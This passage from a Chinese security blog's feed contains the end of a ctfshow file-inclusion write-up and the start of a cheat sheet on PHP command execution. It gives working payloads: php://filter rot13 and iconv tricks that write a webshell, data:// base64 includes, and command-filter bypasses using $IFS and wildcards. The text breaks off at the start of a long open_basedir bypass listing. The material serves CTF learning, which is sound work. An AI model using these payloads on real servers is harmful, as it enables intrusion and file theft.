class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拉高线程数故技重施！</p><p>此题是读一下，文件内容然后，对文件内容进行判断，后进行包含</p><h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制了文件路径，但之前的方法依然可以用。</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与除夕夜的红包题类似，只不过把一个参数改成了两个难度其实是减小了，干脆对比一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$content = $_GET[content];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">payload：</span><br><span class="line">content=php://filter/write=string.rot13|&lt;?cuc uvtuyvtug_svyr(&#x27;/synt.gkg&#x27;); ?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure><p>原理比较简单，利用一个加密与解密同样的方法，所以使用凯撒密码，将我们想用的东西留下，其余的加密成乱码，在php文件解析时，会把他们当成html的内容，从而不执行。</p><p>此处只需要，在前面利用文件包含，后面写入木马</p><p>payload：此处为了能够绕过，file进行了两次url全加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp sy*.cuc&#x27;); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用之前的脚本，没有过滤data，也可以使用data://协议</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7ICA/PmFh</span><br></pre></td></tr></table></figure><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>打开是个视频，看前端也没看出来有啥东西。用binwalk扫了一下又一张png</p><p>直接提取</p><p><img src="https://img-blog.csdnimg.cn/b0cbc3ae48464d61ba1169f243f19703.png" alt="img"></p><p>康康图片</p><p><img src="https://img-blog.csdnimg.cn/4a1485367f4e43498e9d8676e351df82.png" alt="img"></p><p>只能用php://filter</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>base64和rot13被过滤了，用一种其他的协议即可</p><p>payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php </span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow文件包含&quot;&gt;&lt;a href=&quot;#ctfshow文件包含&quot; class=&quot;headerlink&quot; title=&quot;ctfshow文件包含&quot;&gt;&lt;/a&gt;ctfshow文件包含&lt;/h1&gt;&lt;h2 id=&quot;web78&quot;&gt;&lt;a href=&quot;#web78&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>web安全之命令执行</title>
    <link href="http://websec.space/2022/02/04/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://websec.space/2022/02/04/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-02-03T16:00:00.000Z</published>
    <updated>2022-02-04T09:37:12.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web安全之命令执行"><a href="#web安全之命令执行" class="headerlink" title="web安全之命令执行"></a>web安全之命令执行</h1><p>无聊时间，写点最近一直研究的命令执行的一些心得与总结。</p><p>希望做成一个类似字典类型的文档。</p><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>通常情况下，在开发者使用一些执行命令函数且未对用户输入的数据进行安全检查时，可以注入恶意命令，是整台服务器处于危险中。</p><blockquote><p>这个定义可能有点抽象，举个简单的例子，例如一段PHP程序想在程序运行中，去调用其他一个python的系统，他使用system(‘python main.py’);去运行这个系统，但一旦括号中的内容我们可控，这时候漏洞就产生了。</p></blockquote><p>在ctf中，命令执行一般发生在远程，故称为远程命令执行即rce，今年因为log4j的出现，可以说是rce的高光。</p><p>在此放一个命令执行漏洞的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>1.直接获取flag</p><p>2.进行反弹shell，然后进入内网的大门</p><p>3.利用出题人对权限的控制不严格，对题目环境拥有控制权，导致其他队伍选手无法解题。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>转义字符</strong>，windows的注意字符为^ ,Linux的转义字符为\</p><p><strong>多条命令执行</strong>，Windows下为&amp;&amp;、||、%0a，linux为&amp;&amp;、||、;、$()、``、%0a、%0d</p><blockquote><p>在Linux情况下需要注意的是，双引号包裹的”``”,”$()”的内容被当作命令执行，但是单引号包裹的字符串就是纯字符串，不会做任何解析。</p></blockquote><p><strong>黑名单绕过</strong></p><p><strong>白名单绕过</strong></p><h2 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h2><h3 id="查看文件路径的方式"><a href="#查看文件路径的方式" class="headerlink" title="查看文件路径的方式"></a>查看文件路径的方式</h3><h4 id="利用scandir函数"><a href="#利用scandir函数" class="headerlink" title="利用scandir函数"></a>利用scandir函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><h4 id="利用glob"><a href="#利用glob" class="headerlink" title="利用glob://"></a>利用glob://</h4><p><strong>glob:// — 查找匹配的文件路径模式</strong></p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121916703">(43条消息) 绕过open_basedir的限制_unexpectedthing的博客-CSDN博客</a></p><p>贴一篇文章查找根目录下的文件夹</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&#x27;glob:///*&#x27;);</span><br><span class="line">foreach($dir as $d)&#123;</span><br><span class="line">    echo $d-&gt;__toString().&#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">?&gt;</span><br><span class="line">//url编码</span><br></pre></td></tr></table></figure><h3 id="过滤常见的函数"><a href="#过滤常见的函数" class="headerlink" title="过滤常见的函数"></a>过滤常见的函数</h3><h4 id="利用复制文件"><a href="#利用复制文件" class="headerlink" title="利用复制文件"></a>利用复制文件</h4><p>以希望读取flag.php为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</span><br></pre></td></tr></table></figure><p>此时直接访问/z.txt即可查看</p><h4 id="有其他可以执行且可以通过http传参的变量"><a href="#有其他可以执行且可以通过http传参的变量" class="headerlink" title="有其他可以执行且可以通过http传参的变量"></a>有其他可以执行且可以通过http传参的变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">[post data]</span><br><span class="line">a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h4 id="利用show-source"><a href="#利用show-source" class="headerlink" title="利用show_source"></a>利用show_source</h4><p>exp1：</p><p>只能得到数组的第二位或者倒数第二位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp2：</p><p>随机获取，需要多刷新几次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp3：鸡肋，有时候不能拿到实际值</p><p>session_start(): 告诉PHP使用<a href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>;    session_id(): 获取到当前的session_id值；手动设置cookie中PHPSESSID=flag.php；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><h4 id="利用include使用文件包含"><a href="#利用include使用文件包含" class="headerlink" title="利用include使用文件包含"></a>利用include使用文件包含</h4><h5 id="利用php"><a href="#利用php" class="headerlink" title="利用php://"></a>利用php://</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><strong>php://协议</strong></p><p><strong>条件</strong>：</p><p><code>allow_url_fopen</code>:off/on</p><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p><p>作用<strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于</strong>读取源码<strong>，<code>php://input</code>用于</strong>执行php代码。</p><p>说明：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。不要用hacker传参</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=TvNqxQJsmPli714fAg4qxA==.jfUSJBdJsmST/7kefiWpUGR3c09fXjXvpga5K0ExDmpAxVkhIcaZZ7Oag21SmAlO">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><p>实例：</p><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATA部分](不要用hackbar传参)</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="利用data"><a href="#利用data" class="headerlink" title="利用data://"></a>利用data://</h5><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain,&lt;?php cat fl*g.php ?&gt;</span><br></pre></td></tr></table></figure><p><strong><code>data://</code> 协议</strong></p><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain,</span><br><span class="line">data:<span class="regexp">//</span>text/plain;base64,</span><br></pre></td></tr></table></figure></li></ul><h3 id="过滤掉文件名"><a href="#过滤掉文件名" class="headerlink" title="过滤掉文件名"></a>过滤掉文件名</h3><p>以过滤掉了flag举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;cat fl&quot;&quot;ag.php&#x27;);</span><br><span class="line">system(&#x27;cat fla``g.php&#x27;);</span><br><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><p>利用通配符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fla?.php</span><br><span class="line">fla*</span><br></pre></td></tr></table></figure><h3 id="过滤掉了空格"><a href="#过滤掉了空格" class="headerlink" title="过滤掉了空格"></a>过滤掉了空格</h3><p>法一：%0a，%0d</p><p>法二：利用系统中的环境变量</p><p>Linux下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$IFS$9</span><br><span class="line">&#123;cmd,args&#125;</span><br><span class="line">cat&lt;&gt;flag</span><br><span class="line">$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤了字母"><a href="#过滤了字母" class="headerlink" title="过滤了字母"></a>过滤了字母</h3><h5 id="执行临时存储文件"><a href="#执行临时存储文件" class="headerlink" title="执行临时存储文件"></a>执行临时存储文件</h5><p>开启设置后，php在接受到未知的文件时，会临时储存利用这个特性，写一个木马并将其执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=.+/???/????????[@-[]</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><h5 id="base64流"><a href="#base64流" class="headerlink" title="base64流"></a>base64流</h5><p>这种情况只能事system执行，且linux下/bin下有base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/???/????64 ????.???</span><br><span class="line">#/bin/base64 flag.php </span><br></pre></td></tr></table></figure><h5 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h5><p>bzip2的使用<br>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure><p>也就是/usr/bin/bzip2 flag.php<br>然后访问/flag.php.bz2进行下载获得flag.php</p><h3 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a>过滤了数字</h3><p>在能使用system，shell中可以利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><h3 id="open-basedir受限"><a href="#open-basedir受限" class="headerlink" title="open basedir受限"></a>open basedir受限</h3><h4 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 